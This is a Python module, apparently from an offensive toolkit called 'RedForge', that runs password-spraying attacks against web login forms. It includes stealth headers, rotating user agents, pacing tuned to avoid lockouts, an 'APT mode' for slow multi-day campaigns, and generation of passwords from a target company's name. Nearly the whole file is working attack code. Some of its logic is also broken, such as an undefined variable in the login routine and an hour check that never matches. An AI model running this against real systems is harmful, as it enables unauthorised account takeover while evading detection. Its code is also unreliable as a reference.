#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de password spraying pour RedForge
Attaque par pulvérisation de mots de passe sur plusieurs comptes
Version avec support furtif, APT et génération intelligente
"""

import time
import random
import requests
import re
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime, timedelta
import json

@dataclass
class PasswordSprayingConfig:
    """Configuration avancée pour le password spraying"""
    # Délais
    delay_between_attempts: Tuple[float, float] = (2, 5)  # Délai plus long pour spraying
    delay_between_passwords: Tuple[float, float] = (30, 120)  # Pause entre les mots de passe
    delay_between_batches: Tuple[float, float] = (300, 900)  # Pause entre les lots (5-15 min)
    
    # Comportement
    batch_size: int = 50
    max_attempts_per_password: int = 100
    rotate_users: bool = True
    randomize_order: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    respect_lockout: bool = True
    
    # APT
    apt_mode: bool = False
    extended_operation: bool = False  # Opération sur plusieurs jours
    human_behavior: bool = True
    ip_rotation: bool = False
    
    # Intelligence
    generate_company_passwords: bool = True
    analyze_lockout_patterns: bool = True
    adaptive_spraying: bool = True
    
    # Proxies
    proxies: List[str] = field(default_factory=list)
    proxy_rotation: bool = False


class PasswordSpraying:
    """Attaque par password spraying avec support avancé"""
    
    def __init__(self, config: Optional[PasswordSprayingConfig] = None):
        """
        Initialise l'attaque de password spraying
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or PasswordSprayingConfig()
        
        # Mots de passe courants pour spraying (améliorés)
        self.common_passwords = [
            # Standards
            "Password123", "Welcome1", "Pass@123", "Admin123", "Qwerty123",
            "123456", "password", "12345678", "qwerty", "abc123",
            "Password1", "Welcome2023", "Pass123", "Admin@123",
            # Saisonniers
            "Summer2023", "Winter2023", "Spring2024", "Fall2024",
            "Summer2024", "Winter2024",
            # Temporels
            "January2024", "February2024", "March2024",
            "2024Password", "2024Admin",
            # Communs d'entreprise
            "Company123", "Secure123", "Network123", "Default123"
        ]
        
        # Utilisateurs communs
        self.common_usernames = [
            "admin", "administrator", "user", "test", "support",
            "info", "contact", "webmaster", "root", "service",
            "helpdesk", "backup", "admin1", "admin2", "sysadmin",
            "itadmin", "network", "security", "audit", "monitoring"
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:90.0) Gecko/20100101 Firefox/90.0'
        ]
        
        # Métriques
        self.attempts_count = 0
        self.success_count = 0
        self.lockout_detected = False
        self.locked_accounts: Set[str] = set()
        self.start_time = None
        self.batch_start_time = None
        
        # Patterns de lockout
        self.lockout_patterns = [
            r'account locked',
            r'too many attempts',
            r'temporarily locked',
            r'please try again later',
            r'maximum attempts exceeded'
        ]
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Exécute une attaque de password spraying
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - password: Mot de passe unique à tester
                - passlist: Liste personnalisée de mots de passe
                - usernames: Liste d'utilisateurs à tester
                - company: Nom de l'entreprise (génération intelligente)
                - username_field: Nom du champ username
                - password_field: Nom du champ password
                - delay: Délai entre les tentatives
                - batch_mode: Mode lot (pause entre les lots)
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.attempts_count = 0
        self.success_count = 0
        self.locked_accounts.clear()
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        print(f"  → Password spraying sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Opération prolongée et discrète")
        
        found_credentials = []
        
        # Déterminer les listes
        passwords = self._get_passwords(kwargs)
        usernames = self._get_usernames(kwargs)
        
        # Générer des mots de passe basés sur l'entreprise
        if self.config.generate_company_passwords and kwargs.get('company'):
            company_passwords = self.generate_effective_passwords(kwargs['company'])
            passwords.extend(company_passwords)
            passwords = list(set(passwords))
        
        username_field = kwargs.get('username_field', 'username')
        password_field = kwargs.get('password_field', 'password')
        
        # Filtrer les utilisateurs verrouillés
        active_usernames = [u for u in usernames if u not in self.locked_accounts]
        
        # Randomiser l'ordre
        if self.config.randomize_order:
            random.shuffle(passwords)
            if self.config.rotate_users:
                random.shuffle(active_usernames)
        
        total_combinations = len(passwords) * len(active_usernames)
        print(f"    → Test de {len(passwords)} mots de passe sur {len(active_usernames)} utilisateurs")
        print(f"    → Total combinaisons: {total_combinations}")
        
        # Traitement par lots pour opérations longues
        batches = self._create_batches(passwords, active_usernames)
        
        for batch_idx, batch_passwords in enumerate(batches):
            self.batch_start_time = time.time()
            
            print(f"\n    → Lot {batch_idx + 1}/{len(batches)}: {len(batch_passwords)} mots de passe")
            
            for password in batch_passwords:
                # Vérifier si on a détecté un lockout général
                if self.lockout_detected and self.config.respect_lockout:
                    print(f"      ⚠️ Lockout détecté - pause prolongée")
                    time.sleep(random.uniform(300, 600))  # 5-10 minutes
                    self.lockout_detected = False
                
                print(f"      → Test du mot de passe: {password}")
                
                results = self._spray_password(
                    target, password, active_usernames,
                    username_field, password_field
                )
                
                for result in results:
                    if result['success']:
                        found_credentials.append({
                            "username": result['username'],
                            "password": password,
                            "status_code": result.get('status_code'),
                            "response_time": result.get('response_time')
                        })
                        print(f"        ✓ Trouvé: {result['username']}:{password}")
                        
                        # Retirer l'utilisateur des tests futurs
                        if result['username'] in active_usernames:
                            active_usernames.remove(result['username'])
                        
                        if kwargs.get('stop_on_find', True):
                            return self._generate_results(target, found_credentials)
                
                # Pause entre les mots de passe
                if self.config.apt_mode and self.config.human_behavior:
                    self._apt_pause_between_passwords()
                else:
                    delay = random.uniform(*self.config.delay_between_passwords)
                    print(f"      💤 Pause de {delay:.0f}s avant prochain mot de passe")
                    time.sleep(delay)
            
            # Pause entre les lots (pour opérations APT)
            if batch_idx < len(batches) - 1:
                if self.config.apt_mode and self.config.extended_operation:
                    # Pause plus longue, simule une opération sur plusieurs jours
                    pause = random.uniform(3600, 14400)  # 1-4 heures
                    print(f"\n    💤 Pause inter-lot APT: {pause/60:.0f} minutes")
                    time.sleep(pause)
                else:
                    pause = random.uniform(*self.config.delay_between_batches)
                    print(f"\n    💤 Pause inter-lot: {pause/60:.1f} minutes")
                    time.sleep(pause)
        
        return self._generate_results(target, found_credentials)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'delay' in kwargs:
            self.config.delay_between_attempts = (kwargs['delay'], kwargs['delay'] * 1.5)
        if 'batch_mode' in kwargs and kwargs['batch_mode']:
            self.config.delay_between_batches = (120, 300)
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.extended_operation = True
            self.config.human_behavior = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_attempts = (5, 15)
            self.config.delay_between_passwords = (60, 300)
            self.config.delay_between_batches = (1800, 7200)  # 30 min - 2 heures
        
        # Stealth mode
        if kwargs.get('stealth_mode', False):
            self.config.stealth_headers = True
            self.config.random_user_agents = True
            self.config.random_delays = True
    
    def _create_batches(self, passwords: List[str], usernames: List[str]) -> List[List[str]]:
        """Crée des lots de mots de passe pour opérations prolongées"""
        if not self.config.extended_operation:
            return [passwords]
        
        # Taille adaptative des lots
        batch_size = max(1, len(passwords) // 5)  # 5 lots maximum
        batches = []
        
        for i in range(0, len(passwords), batch_size):
            batch = passwords[i:i + batch_size]
            batches.append(batch)
        
        return batches
    
    def _spray_password(self, target: str, password: str, usernames: List[str],
                       username_field: str, password_field: str) -> List[Dict]:
        """
        Pulvérise un mot de passe sur plusieurs utilisateurs
        
        Args:
            target: URL cible
            password: Mot de passe à tester
            usernames: Liste des utilisateurs
            username_field: Nom du champ username
            password_field: Nom du champ password
        """
        results = []
        
        # Tester chaque utilisateur avec le même mot de passe
        for username in usernames:
            # Vérifier si l'utilisateur est locké
            if username in self.locked_accounts:
                continue
            
            result = self._test_login(target, username, password,
                                     username_field, password_field)
            result['username'] = username
            results.append(result)
            
            self.attempts_count += 1
            if result['success']:
                self.success_count += 1
            
            # Délai entre les tentatives
            if self.config.random_delays:
                delay = random.uniform(*self.config.delay_between_attempts)
            else:
                delay = self.config.delay_between_attempts[1]
            
            time.sleep(delay)
        
        return results
    
    def _test_login(self, target: str, username: str, password: str,
                    username_field: str, password_field: str) -> Dict[str, Any]:
        """
        Teste une combinaison username/password avec options furtives
        """
        result = {
            "success": False,
            "username": username,
            "password": password,
            "status_code": None,
            "response_time": None
        }
        
        try:
            session = requests.Session()
            
            # Headers furtifs
            headers = {
                'User-Agent': random.choice(self.user_agents) if self.config.random_user_agents else self.user_agents[0],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
            
            if self.config.stealth_headers:
                headers['Referer'] = target
            
            data = {
                username_field: username,
                password_field: password
            }
            
            # Ajouter des paramètres supplémentaires pour paraître légitime
            if 'remember' in kwargs:
                data['remember_me'] = 'on'
            
            # Mesurer le temps de réponse
            start_time = time.time()
            response = session.post(
                target, data=data, headers=headers,
                timeout=10, verify=False, allow_redirects=False
            )
            result["response_time"] = time.time() - start_time
            result["status_code"] = response.status_code
            
            # Détection de succès améliorée
            result["success"] = self._is_login_successful(response)
            
            # Détection de lockout
            if self._is_account_locked(response):
                self.locked_accounts.add(username)
                if not self.lockout_detected:
                    self.lockout_detected = True
                    
        except requests.exceptions.Timeout:
            result["error"] = "Timeout"
        except requests.exceptions.ConnectionError:
            result["error"] = "Connection error"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _is_login_successful(self, response: requests.Response) -> bool:
        """Détermine si la tentative de login a réussi"""
        success_indicators = [
            response.status_code == 302,
            'dashboard' in response.text.lower(),
            'welcome' in response.text.lower(),
            'success' in response.text.lower(),
            'logged in' in response.text.lower(),
            'redirect' in response.headers.get('Location', '').lower(),
            response.status_code == 200 and 'login' not in response.text.lower()
        ]
        
        failure_indicators = [
            'invalid' in response.text.lower(),
            'incorrect' in response.text.lower(),
            'failed' in response.text.lower(),
            'error' in response.text.lower(),
            'try again' in response.text.lower()
        ]
        
        success_score = sum(1 for ind in success_indicators if ind)
        failure_score = sum(1 for ind in failure_indicators if ind)
        
        return success_score > 0 and failure_score == 0
    
    def _is_account_locked(self, response: requests.Response) -> bool:
        """Détecte si un compte est verrouillé"""
        for pattern in self.lockout_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        return False
    
    def _get_passwords(self, kwargs: Dict) -> List[str]:
        """Récupère la liste des mots de passe à tester"""
        passwords = []
        
        if kwargs.get('password'):
            passwords = [kwargs['password']]
        elif kwargs.get('passlist'):
            try:
                with open(kwargs['passlist'], 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"    ⚠️ Erreur chargement passlist: {e}")
                passwords = self.common_passwords.copy()
        else:
            passwords = self.common_passwords.copy()
        
        # Limiter pour éviter le lockout
        if self.config.max_attempts_per_password:
            passwords = passwords[:self.config.max_attempts_per_password]
        
        return passwords
    
    def _get_usernames(self, kwargs: Dict) -> List[str]:
        """Récupère la liste des utilisateurs à tester"""
        if kwargs.get('username'):
            return [kwargs['username']]
        elif kwargs.get('userlist'):
            try:
                with open(kwargs['userlist'], 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                    return usernames
            except:
                return self.common_usernames
        else:
            return self.common_usernames
    
    def _apt_pause_between_passwords(self):
        """Pause APT entre les mots de passe"""
        # Périodes variables selon l'heure simulée
        current_hour = datetime.now().hour
        
        if 9 <= current_hour <= 17:  # Heures de bureau
            delay_range = (60, 180)  # 1-3 minutes
        elif 22 <= current_hour <= 5:  # Nuit
            delay_range = (300, 900)  # 5-15 minutes
        else:  # Soirée
            delay_range = (120, 300)  # 2-5 minutes
        
        delay = random.uniform(*delay_range)
        print(f"      💤 Pause APT: {delay:.0f}s")
        time.sleep(delay)
    
    def generate_effective_passwords(self, company_name: str, 
                                    year: Optional[int] = None) -> List[str]:
        """
        Génère des mots de passe efficaces basés sur le nom de l'entreprise
        
        Args:
            company_name: Nom de l'entreprise cible
            year: Année courante (optionnel)
        """
        if year is None:
            year = datetime.now().year
        
        passwords = set()
        
        # Variations basées sur le nom
        base_names = [
            company_name,
            company_name.capitalize(),
            company_name.upper(),
            company_name.lower(),
            company_name.replace(' ', ''),
            company_name.replace('-', ''),
            company_name.replace('_', '')
        ]
        
        # Patterns courants
        patterns = [
            "{name}",
            "{name}123",
            "{name}2023",
            "{name}2024",
            "{name}@{year}",
            "{name}!",
            "{name}#",
            "{name}123!",
            "Pass{name}",
            "{name}Pass",
            "Admin{name}",
            "{name}Admin",
            "Welcome{name}",
            "{name}Welcome",
            "Secure{name}",
            "{name}Secure",
            "{name}{year}",
            "{year}{name}",
            "P@ss{name}",
            "{name}P@ss"
        ]
        
        # Saisons
        seasons = ["Spring", "Summer", "Fall", "Winter", 
                  "Printemps", "Ete", "Automne", "Hiver"]
        
        # Générer les combinaisons
        for name in base_names:
            for pattern in patterns:
                try:
                    password = pattern.format(name=name, year=year)
                    passwords.add(password)
                except:
                    pass
            
            # Avec saisons
            for season in seasons:
                passwords.add(f"{season}{year}")
                passwords.add(f"{season}{name}")
                passwords.add(f"{name}{season}")
        
        # Ajouter l'année courante et suivante
        for y in [year, year+1, year-1]:
            passwords.add(f"Company{y}")
            passwords.add(f"{company_name}{y}")
            passwords.add(f"{y}{company_name}")
        
        return list(passwords)
    
    def _generate_results(self, target: str, 
                         found_credentials: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        results = {
            "target": target,
            "found_credentials": found_credentials,
            "passwords_tested": len(self._get_passwords({})),
            "users_tested": len(self._get_usernames({})),
            "total_attempts": self.attempts_count,
            "successful_attempts": len(found_credentials),
            "duration_seconds": duration,
            "attempts_per_hour": (self.attempts_count / duration) * 3600 if duration > 0 else 0,
            "locked_accounts_detected": len(self.locked_accounts),
            "config": {
                "apt_mode": self.config.apt_mode,
                "extended_operation": self.config.extended_operation,
                "adaptive_spraying": self.config.adaptive_spraying
            },
            "summary": self._generate_summary(found_credentials),
            "recommendations": self._generate_recommendations()
        }
        
        return results
    
    def _generate_summary(self, found_credentials: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des résultats"""
        if not found_credentials:
            return {
                "total_found": 0,
                "severity": "INFO",
                "message": "Aucun credential trouvé par password spraying"
            }
        
        return {
            "total_found": len(found_credentials),
            "severity": "HIGH",
            "unique_passwords": len(set(c['password'] for c in found_credentials)),
            "unique_users": len(set(c['username'] for c in found_credentials)),
            "credentials": [
                {
                    "username": c['username'],
                    "password": c['password'][:3] + "***" if len(c['password']) > 6 else "***"
                }
                for c in found_credentials[:5]
            ]
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Génère des recommandations basées sur l'attaque"""
        recommendations = []
        
        if self.success_count > 0:
            recommendations.append("Implémenter une politique de mots de passe plus stricte")
            recommendations.append("Utiliser l'authentification multi-facteurs (MFA)")
        
        if self.locked_accounts:
            recommendations.append("Configurer des alertes pour les tentatives multiples")
            recommendations.append("Implémenter un délai progressif entre les tentatives")
        
        if not self.lockout_detected:
            recommendations.append("Ajouter un mécanisme de lockout après X tentatives")
        
        recommendations.append("Former les utilisateurs aux bonnes pratiques de mots de passe")
        
        return list(set(recommendations))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de l'attaque"""
        return {
            "total_attempts": self.attempts_count,
            "successful_attempts": self.success_count,
            "success_rate": (self.success_count / self.attempts_count * 100) if self.attempts_count > 0 else 0,
            "locked_accounts": len(self.locked_accounts),
            "duration_seconds": time.time() - self.start_time if self.start_time else 0,
            "attempts_per_hour": (self.attempts_count / (time.time() - self.start_time) * 3600) if self.start_time and (time.time() - self.start_time) > 0 else 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    ps = PasswordSpraying()
    results = ps.scan("https://example.com/login")
    print(f"Credentials trouvés: {len(results['found_credentials'])}")
    
    # Test mode APT avec génération intelligente
    print("\n=== Test mode APT ===")
    apt_config = PasswordSprayingConfig(apt_mode=True, extended_operation=True)
    ps_apt = PasswordSpraying(config=apt_config)
    
    # Générer des mots de passe basés sur l'entreprise
    company_passwords = ps_apt.generate_effective_passwords("AcmeCorp")
    print(f"Généré {len(company_passwords)} mots de passe basés sur AcmeCorp")
    
    results_apt = ps_apt.scan(
        "https://example.com/login",
        company="AcmeCorp",
        usernames=["admin", "user1", "user2"],
        apt_mode=True
    )
    print(f"Credentials trouvés (APT): {len(results_apt['found_credentials'])}")